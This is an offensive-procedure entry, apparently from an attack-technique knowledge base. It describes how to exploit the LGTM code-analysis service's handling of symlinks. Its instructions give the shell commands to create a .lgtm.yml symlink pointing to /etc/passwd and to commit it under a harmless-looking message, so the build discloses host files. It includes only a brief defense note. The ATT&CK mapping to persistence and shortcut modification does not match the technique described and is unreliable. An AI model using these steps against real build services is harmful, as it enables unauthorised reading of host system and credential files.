---
id: proc-lgtm-malicious-symlink
tags:
  - symlink
  - malicious
  - lgtm
type: procedure
tools: []
tactics:
  - '[[Persistence]]'
commands: []
verified: false
platforms:
  - Linux
  - Docker
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Shortcut Modification]]'
updated_at: '2025-12-14T17:26:29.967Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Shortcut Modification]]'
---
# Create-Malicious-LGTM-Symlink

## Summary

This procedure creates a symbolic link named .lgtm.yml in the repository, pointing to a sensitive host file like /etc/passwd, exploiting LGTM's lack of symlink validation during file retention.

## Description

LGTM skips processing .lgtm.yml but retains it alongside lgtm.yml after build. Without sanitization, the symlink resolves to host paths in the container escape context. Target is the repository root; prerequisites include the configured project. Expected outcome: Symlink committed, ready for build-time resolution to disclose host data.

## Requirements

1. Configured GitHub repository
2. Local environment supporting symlink creation (Linux/macOS)
3. Understanding of target host files for demonstration

## Defense

Defensive measures and detection strategies:

- Sanitize symlinks in build inputs by refusing or resolving them safely
- Detect symlink usage in repository scans pre-build

## Objectives

1. Inject symlink to bypass isolation
2. Target sensitive host locations
3. Enable post-build file exposure

## Instructions

### Step 1: Create Symlink Locally

**Context**: In the local repository clone, create the symlink targeting a host-sensitive file.

```bash
ln -s /etc/passwd .lgtm.yml
```

> Uses /etc/passwd as example; in real exploit, this points outside container.

### Step 2: Stage for Git

**Context**: Git treats symlinks as special files; add without dereferencing.

```bash
git add .lgtm.yml
git commit -m "Add symlink configuration"
```

> Commits the symlink entry, not the target content.

### Step 3: Push Changes

**Context**: Upload to GitHub for LGTM access.

```bash
git push origin main
```

> Symlink now in remote repo, preserved as is.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]] Persistence

### Techniques

- [[Shortcut Modification]] Boot or Logon Autostart Execution: Shortcut Modification (adapted for symlink)

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[symlink]]
- [[malicious]]
- [[lgtm]]
